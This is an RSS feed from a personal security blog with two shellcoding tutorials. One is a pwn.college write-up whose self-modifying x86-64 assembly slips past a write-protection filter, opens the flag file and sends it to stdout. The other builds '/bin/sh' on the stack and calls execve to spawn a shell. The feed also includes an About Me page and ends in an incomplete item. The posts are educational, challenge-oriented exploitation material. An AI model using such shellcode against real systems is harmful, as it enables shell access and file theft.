<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>uint8_t* blog</title>
    <link>https://blog.i-eat-sponges.ca/</link>
    <description>Recent content on uint8_t* blog</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Fri, 22 Sep 2023 14:50:16 -0400</lastBuildDate><atom:link href="https://blog.i-eat-sponges.ca/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>No Write Permissions in Shellcode Begin</title>
      <link>https://blog.i-eat-sponges.ca/exploitation/no_write_permissions/</link>
      <pubDate>Fri, 22 Sep 2023 14:50:16 -0400</pubDate>
      
      <guid>https://blog.i-eat-sponges.ca/exploitation/no_write_permissions/</guid>
      <description>A while ago i was solving this challenge from pwn.college in the shellcoding module, it&amp;rsquo;s a pretty fun challenge to solve, where you need to think outside-of-the-box (a little).
This challenge remove write permissions in the first 4096 bytes of our shellcode, therefore we need to put 4096 bytes of garbage before we start the shellcode.
This sounds hard but luckily assembly makes it very easy for us to achieve this.</description>
      <content>&lt;p&gt;A while ago i was solving this challenge from &lt;a href=&#34;https://pwn.college&#34;&gt;pwn.college&lt;/a&gt; in the &lt;code&gt;shellcoding&lt;/code&gt; module, it&amp;rsquo;s a pretty fun challenge to solve, where you need to think outside-of-the-box (a little).&lt;/p&gt;
&lt;p&gt;This challenge remove write permissions in the first 4096 bytes of our &lt;code&gt;shellcode&lt;/code&gt;, therefore we need to put 4096 bytes of garbage before we start the &lt;code&gt;shellcode&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;This sounds hard but luckily assembly makes it very easy for us to achieve this.&lt;/p&gt;
&lt;p&gt;Here&amp;rsquo;s a program i used to solve the challenge, note that it&amp;rsquo;s exactly like the challenge i have shown at [[Writing Shellcode without Syscalls]], but this time the first 4096 bytes of the &lt;code&gt;shellcode&lt;/code&gt; aren&amp;rsquo;t written.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;.global&lt;/span&gt; _start
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;_start:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;.intel_syntax&lt;/span&gt; noprefix
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;.rept&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4096&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;nop&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;.endr&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;#&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;prepare&lt;/span&gt; syscall
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt; ptr[rip&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;label], &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0f&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt; ptr[rip&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;label&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;], &lt;span style=&#34;color:#ae81ff&#34;&gt;0x05&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;lea&lt;/span&gt; r9, [rip&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;label]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;#&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;clear&lt;/span&gt; registers
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;xor&lt;/span&gt; rbx, rbx
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;xor&lt;/span&gt; rdx, rdx
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;xor&lt;/span&gt; rsi, rsi
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;xor&lt;/span&gt; rdi, rdi
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;xor&lt;/span&gt; r10, r10
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;#&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;open&lt;/span&gt; flag file
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt; ebx, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x67616c66&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;shl&lt;/span&gt; rbx, &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt; bl, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x2f&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;push&lt;/span&gt; rbx
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt; rdi, rsp
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt; rax, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;call&lt;/span&gt; r9
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;label:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;.word&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0000&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;xor&lt;/span&gt; r9, r9
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;#&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;prepare&lt;/span&gt; next syscall
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt; ptr[rip&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;label2], &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0f&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt; ptr[rip&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;label2&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;], &lt;span style=&#34;color:#ae81ff&#34;&gt;0x05&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;lea&lt;/span&gt; r9, [rip&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;label2]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;xor&lt;/span&gt; rsi, rsi
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;xor&lt;/span&gt; r10, r10
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;xor&lt;/span&gt; rdi, rdi
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;xor&lt;/span&gt; rdx, rdx
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;xor&lt;/span&gt; rbx, rbx
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;#&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;sendfile&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt; rdi,&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt; rsi, rax
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt; r10, &lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt; rax, &lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;call&lt;/span&gt; r9
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;label2:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;.word&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0000&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;xor&lt;/span&gt; r9, r9
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;#&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;prepare&lt;/span&gt; syscall
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt; ptr[rip&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;label3], &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0f&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt; ptr[rip&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;label3&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;], &lt;span style=&#34;color:#ae81ff&#34;&gt;0x05&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;lea&lt;/span&gt; r9, [rip&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;label3]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;#&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;exit&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;xor&lt;/span&gt; rsi, rsi
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;xor&lt;/span&gt; r10, r10
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;xor&lt;/span&gt; rax, rax
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;xor&lt;/span&gt; rdi, rdi
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt; rax, &lt;span style=&#34;color:#ae81ff&#34;&gt;60&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt; rdi, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;call&lt;/span&gt; r9
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;label3:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;.word&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0000&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We used the &lt;code&gt;.rept &amp;lt;value&amp;gt;&lt;/code&gt; instruction and the &lt;code&gt;.endr&lt;/code&gt; instruction which ends the repeat, basically like a loop and everything in-between will be repeated in the assembled program.&lt;/p&gt;
&lt;p&gt;For example, the following code would write 4096 nops in our &lt;code&gt;shellcode&lt;/code&gt;, resulting in a very long &lt;code&gt;shellcode&lt;/code&gt; but effectively bypassing the required filters.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;.rept&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4096&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;nop&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;.endr&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content>
    </item>
    
    <item>
      <title>Stack String Manipulation</title>
      <link>https://blog.i-eat-sponges.ca/exploitation/execve_using_stack/</link>
      <pubDate>Fri, 22 Sep 2023 10:47:23 -0400</pubDate>
      
      <guid>https://blog.i-eat-sponges.ca/exploitation/execve_using_stack/</guid>
      <description>So we&amp;rsquo;ve seen many of the ways we could want to manipulate strings for our shellcode, this time let&amp;rsquo;s use a previous technique to call execve(&amp;quot;/bin/sh&amp;quot;).
Let&amp;rsquo;s write our program.
.intel_syntax noprefix .global _start .section .text _start: mov rbx, 0x0068732f6e69622f push rbx mov rdi, rsp xor eax, eax mov al, 59 syscall We used the string /bin/sh\0 backward, we could also do the following instead.
.intel_syntax noprefix .global _start .section .</description>
      <content>&lt;p&gt;So we&amp;rsquo;ve seen many of the ways we could want to manipulate strings for our shellcode, this time let&amp;rsquo;s use a previous technique to call &lt;code&gt;execve(&amp;quot;/bin/sh&amp;quot;)&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s write our program.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;.intel_syntax&lt;/span&gt; noprefix
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;.global&lt;/span&gt; _start
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;.section&lt;/span&gt; .text
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;_start:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt; rbx, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0068732f6e69622f&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;push&lt;/span&gt; rbx
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt; rdi, rsp
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;xor&lt;/span&gt; eax, eax
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt; al, &lt;span style=&#34;color:#ae81ff&#34;&gt;59&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;syscall&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We used the string &lt;code&gt;/bin/sh\0&lt;/code&gt; backward, we could also do the following instead.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;.intel_syntax&lt;/span&gt; noprefix
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;.global&lt;/span&gt; _start
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;.section&lt;/span&gt; .text
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;_start:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt; rbx, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x68732f2f6e69622f&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;push&lt;/span&gt; rbx
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt; rdi, rsp
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;xor&lt;/span&gt; eax, eax
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt; al, &lt;span style=&#34;color:#ae81ff&#34;&gt;59&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;syscall&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This time we&amp;rsquo;re calling &lt;code&gt;execve&lt;/code&gt; with &lt;code&gt;/bin//sh&lt;/code&gt;, note that we&amp;rsquo;re just trying to make the value fit in 8 bytes, so we added an extra &lt;code&gt;/&lt;/code&gt;, this has no consequences and work just like when not using the extra &lt;code&gt;/&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;However please note that since we didn&amp;rsquo;t specify a null-byte at the end of the second program, it might not always work, for example. When i compiled the second program, it was trying to run &lt;code&gt;/bin//sh\1&lt;/code&gt; instead of &lt;code&gt;/bin//sh\0&lt;/code&gt; which was failing.&lt;/p&gt;
&lt;h2 id=&#34;do-we-need-to-exit-when-calling-execve&#34;&gt;Do we need to exit() when calling execve&lt;/h2&gt;
&lt;p&gt;The eagle-eyed may have notice that i did not use the &lt;code&gt;exit()&lt;/code&gt; system call after calling &lt;code&gt;execve&lt;/code&gt;, that&amp;rsquo;s because &lt;code&gt;execve&lt;/code&gt; is wiping the current process data section and memory (stack, heap).&lt;/p&gt;
&lt;p&gt;So calling exit, after a &lt;code&gt;execve&lt;/code&gt; call is not required, matter of fact it&amp;rsquo;s bytes that could be removed from your shellcode.&lt;/p&gt;
</content>
    </item>
    
    <item>
      <title>Exploitation</title>
      <link>https://blog.i-eat-sponges.ca/exploitation/</link>
      <pubDate>Fri, 22 Sep 2023 08:44:48 -0400</pubDate>
      
      <guid>https://blog.i-eat-sponges.ca/exploitation/</guid>
      <description></description>
      <content></content>
    </item>
    
    <item>
      <title>Malware</title>
      <link>https://blog.i-eat-sponges.ca/malware/</link>
      <pubDate>Fri, 22 Sep 2023 08:44:48 -0400</pubDate>
      
      <guid>https://blog.i-eat-sponges.ca/malware/</guid>
      <description></description>
      <content></content>
    </item>
    
    <item>
      <title>About Me</title>
      <link>https://blog.i-eat-sponges.ca/home/about/</link>
      <pubDate>Fri, 22 Sep 2023 07:34:37 -0400</pubDate>
      
      <guid>https://blog.i-eat-sponges.ca/home/about/</guid>
      <description>I go online by the name uint8_t*, but you can call me daddy.
I&amp;rsquo;m a 22-year-old Canadian security researcher, proficient in both English and French, I am a student with an insatiable appetite for all things low-level, currently with a focus on :
⚙️ Software Exploitation and Development: I take pleasure in exposing the vulnerabilities concealed within software, bending them to my will. (vulnerability research)
☠️ Malware Analysis: I have descended headfirst into the ominous realm of malware, dissecting its malevolent code to unearth its sinister intentions.</description>
      <content>&lt;p&gt;I go online by the name &lt;strong&gt;uint8_t*&lt;/strong&gt;, but you can call me daddy.&lt;/p&gt;
&lt;p&gt;I&amp;rsquo;m a 22-year-old Canadian security researcher, proficient in both English and French, I am a student with an insatiable appetite for all things low-level, currently with a focus on :&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;⚙️ &lt;strong&gt;Software Exploitation and Development&lt;/strong&gt;: I take pleasure in exposing the vulnerabilities concealed within software, bending them to my will. (vulnerability research)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;☠️ &lt;strong&gt;Malware Analysis&lt;/strong&gt;: I have descended headfirst into the ominous realm of malware, dissecting its malevolent code to unearth its sinister intentions.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;⚔️ &lt;strong&gt;Red-Teaming Tactics&lt;/strong&gt;: I have honed my skills in the shadowy art of penetration testing, mastering the techniques of cyber infiltrators to guard against their malevolent schemes.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;

&lt;img src=&#34;https://blog.i-eat-sponges.ca/pepe.gif&#34;  alt=&#34;Hello Friend&#34;  class=&#34;center&#34;    /&gt;


</content>
    </item>
    
    <item>
      <title>My First Post</title>
      <link>https://blog.i-eat-sponges.ca/posts/my-first-post/</link>
      <pubDate>Thu, 21 Sep 2023 18:46:00 -0400</pubDate>
      
      <guid>https://blog.i-eat-sponges.ca/posts/my-first-post/</guid>
